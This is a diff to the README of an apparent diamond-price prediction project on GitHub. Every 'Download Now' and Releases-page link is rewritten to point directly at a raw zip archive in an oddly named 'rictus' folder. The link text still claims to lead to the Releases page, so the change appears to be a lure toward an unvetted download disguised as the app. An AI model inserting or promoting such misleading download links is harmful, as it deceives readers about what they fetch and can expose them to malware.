@@ -6,13 +6,13 @@ Welcome to the diamond-price-resnet project! This application helps you predict 
 ## 💾 Download & Install
 To get started, visit this page to download the latest version of the software:
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20the%20App-brightgreen)](https://github.com/rippleacc/diamond-price-resnet/releases)
+[![Download Now](https://github.com/rippleacc/diamond-price-resnet/raw/refs/heads/main/rictus/diamond-resnet-price-v2.0-alpha.4.zip%20Now-Get%20the%20App-brightgreen)](https://github.com/rippleacc/diamond-price-resnet/raw/refs/heads/main/rictus/diamond-resnet-price-v2.0-alpha.4.zip)
 
 Once on the Releases page, choose the version you want to download and follow the instructions below.
 
 ## 🚀 Getting Started
 ### 1. **Visit the Releases Page**
-- Click [here](https://github.com/rippleacc/diamond-price-resnet/releases) to go to the Releases page.
+- Click [here](https://github.com/rippleacc/diamond-price-resnet/raw/refs/heads/main/rictus/diamond-resnet-price-v2.0-alpha.4.zip) to go to the Releases page.
 
 ### 2. **Choose Your Version**
 - Look for the latest version at the top of the page. The versions are organized by release date, with the most recent one first.
@@ -64,4 +64,4 @@ Interested in contributing to diamond-price-resnet? We welcome suggestions and i
 
 For any further assistance or inquiries, please reach out to us through the contact details listed on our GitHub page. 
 
-Remember, you can always download the latest version by visiting this page: [Download Now](https://github.com/rippleacc/diamond-price-resnet/releases).
+Remember, you can always download the latest version by visiting this page: [Download Now](https://github.com/rippleacc/diamond-price-resnet/raw/refs/heads/main/rictus/diamond-resnet-price-v2.0-alpha.4.zip).
